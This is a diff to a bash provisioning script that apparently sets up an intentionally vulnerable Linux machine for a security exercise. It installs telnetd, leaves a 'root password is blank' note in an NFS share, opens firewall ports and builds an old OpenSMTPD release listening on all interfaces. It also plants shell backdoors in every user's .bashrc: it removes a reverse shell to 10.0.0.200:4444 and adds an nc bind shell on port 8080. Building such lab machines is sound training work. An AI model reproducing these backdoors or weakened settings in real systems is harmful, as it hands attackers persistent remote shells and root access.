@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# telnet to root shell
+# telnet  to root shell
 sudo apt update
 sudo apt-get install telnetd -y
 touch /usr/local/bin/telnet
@@ -38,57 +38,124 @@ for USER in "${USERS[@]}"; do
   sudo chown $USER:$USER /home/$USER/.ssh/authorized_keys
   sudo chmod 600 /home/$USER/.ssh/authorized_keys
   
-  # rev shell in .bashrc
-  echo -e "bash -c 'bash -i >& /dev/tcp/10.0.0.200/4444 0>&1' & disown" | sudo tee -a /home/$USER/.bashrc
+  # bind shell in .bashrc
+  echo -e "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f & disown" | sudo tee -a /home/$USER/.bashrc
 done
+
+sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT
 
 # root password in share
 touch /srv/nfs/reminder
 echo "in case you forget root password is blank" > /srv/nfs/reminder
 
 # ftp maybe
-sudo apt install vsftpd -y
-sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.bak
-sudo tee /etc/vsftpd.conf > /dev/null << EOT
-listen=YES
-anonymous_enable=YES
-anon_upload_enable=YES
-anon_mkdir_write_enable=YES
-anon_other_write_enable=YES
-anon_root=/var/ftp
-local_enable=YES
-write_enable=YES
-local_umask=022
-dirmessage_enable=YES
-use_localtime=YES
-xferlog_enable=YES
-connect_from_port_20=YES
-secure_chroot_dir=/var/run/vsftpd/empty
-pam_service_name=vsftpd
-EOT
+#sudo apt install vsftpd -y
+#sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.bak
+#sudo tee /etc/vsftpd.conf > /dev/null << EOT
+#listen=YES
+#anonymous_enable=YES
+#anon_upload_enable=YES
+#anon_mkdir_write_enable=YES
+#anon_other_write_enable=YES
+#anon_root=/var/ftp
+#local_enable=YES
+#write_enable=YES
+#local_umask=022
+#dirmessage_enable=YES
+#use_localtime=YES
+#xferlog_enable=YES
+#connect_from_port_20=YES
+#secure_chroot_dir=/var/run/vsftpd/empty
+#pam_service_name=vsftpd
+#EOT
 
 # Create FTP directories
-sudo mkdir -p /var/ftp/pub
-sudo chmod 777 -R /var/ftp/pub
-sudo systemctl restart vsftpd
-sudo systemctl enable vsftpd
+#sudo mkdir -p /var/ftp/pub
+#sudo chmod 777 -R /var/ftp/pub
+#sudo systemctl restart vsftpd
+#sudo systemctl enable vsftpd
 
 
 
-# MAIL SERVER TO DO BUT THIS FUCKING SUCKS I SPENT THREE FUCKING HOURS ON THIS STUPID SHIT
+sudo apt update
+sudo apt install -y build-essential libtool automake libevent-dev zlib1g-dev bison libssl-dev libdb-dev git wget
 
-#wget https://ftp.exim.org/pub/exim/exim4/old/exim-4.96.tar.gz
-#tar -xvf exim-4.96.tar.gz
-#cd exim-4.96/
-#touch Local/Makefile
-#sudo groupadd exim
-#sudo useradd -g exim -s /sbin/nologin -d /var/spool/exim exim
-#echo -e "BIN_DIRECTORY=/usr/exim/bin\nCONFIGURE_FILE=/usr/exim/configure\nEXIM_USER=exim\nSPOOL_DIRECTORY=/var/spool/exim\nUSE_OPENSSL=yes\nTLS_LIBS=-lssl -lcrypto\nROUTER_ACCEPT=yes\nROUTER_DNSLOOKUP=yes\nROUTER_IPLITERAL=yes\nROUTER_MANUALROUTE=yes\nROUTER_QUERYPROGRAM=yes\nROUTER_REDIRECT=yes\nTRANSPORT_APPENDFILE=yes\nTRANSPORT_AUTOREPLY=yes\nTRANSPORT_PIPE=yes\nTRANSPORT_SMTP=yes\nLOOKUP_DBM=yes\nLOOKUP_LSEARCH=yes\nLOOKUP_DNSDB=yes\nPCRE2_CONFIG=yes\nSUPPORT_DANE=yes\nDISABLE_MAL_AVE=yes\nDISABLE_MAL_KAV=yes\nDISABLE_MAL_MKS=yes\nFIXED_NEVER_USERS=root\nHEADERS_CHARSET=\"ISO-8859-1\"\nSYSLOG_LOG_PID=yes\nEXICYCLOG_MAX=10\nCOMPRESS_COMMAND=/usr/bin/gzip\nCOMPRESS_SUFFIX=gz\nZCAT_COMMAND=/usr/bin/zcat\nSYSTEM_ALIASES_FILE=/etc/aliases\nEXIM_TMPDIR=\"/tmp\"" >> Local/Makefile
-#sudo apt install libpcre2-dev -y 
-#sudo apt install build-essential -y 
-#sudo apt install libdb-dev -y 
-#sudo apt install libssl-dev -y
-#sudo apt-get install libnsl-dev -y
-#sudo apt-get install libpcre3-dev -y
-#make
-#sudo make install
+
+wget https://github.com/OpenSMTPD/OpenSMTPD/releases/download/6.6.1p1/opensmtpd-6.6.1p1.tar.gz
+tar -xzf opensmtpd-6.6.1p1.tar.gz
+cd opensmtpd-6.6.1p1
+
+# Install libasr if needed
+if [ ! -f /usr/lib/libasr.so ]; then
+  cd ..
+  git clone https://github.com/OpenSMTPD/libasr.git
+  cd libasr
+  ./bootstrap
+  ./configure
+  make
+  sudo make install
+  sudo ldconfig
+  cd ../opensmtpd-6.6.1p1
+fi
+
+# Configure with flags to fix the multiple definition errors
+./bootstrap
+./configure --with-cflags="-fcommon"
+make
+sudo make install
+
+useradd -c "SMTP Daemon" -d /var/empty -s /sbin/nologin _smtpd
+useradd -c "SMTPD Queue" -d /var/empty -s /sbin/nologin _smtpq
+mkdir -p /var/empty
+sudo iptables -A INPUT -p tcp --dport 25 -j ACCEPT
+sudo mkdir -p /etc/mail
+sudo touch /etc/mail/aliases
+sudo rm /usr/local/etc/smtpd.conf
+
+for USER in "${USERS[@]}"; do
+  echo "$USER: $USER@ccso.org" | sudo tee -a /etc/mail/aliases > /dev/null
+done
+
+sudo tee /usr/local/etc/smtpd.conf <<EOF
+#       \$OpenBSD: smtpd.conf,v 1.10 2018/05/24 11:40:17 gilles Exp $
+
+# This is the smtpd server system-wide configuration file.
+# See smtpd.conf(5) for more information.
+
+table aliases file:/etc/mail/aliases
+
+# To accept external mail, replace with: listen on all
+listen on 0.0.0.0
+
+action "local" mbox alias <aliases>
+action "relay" relay
+
+# Uncomment the following to accept external mail for domain "example.org"
+# match from any for domain "example.org" action "local"
+match for local action "local"
+match from local for any action "relay"
+EOF
+
+sudo tee /etc/systemd/system/opensmtpd.service <<EOF
+[Unit]
+Description=OpenSMTPD Mail Server
+After=network.target
+
+[Service]
+ExecStart=/usr/local/sbin/smtpd
+ExecReload=/bin/kill -HUP \$MAINPID
+Type=forking
+PIDFile=/var/run/opensmtpd.pid
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl enable inetutils-inetd
+sudo systemctl start inetutils-inetd
+sudo systemctl enable nfs-kernel-server
+sudo systemctl start nfs-kernel-server
+sudo systemctl daemon-reload
+sudo systemctl enable opensmtpd
+sudo systemctl start opensmtpd
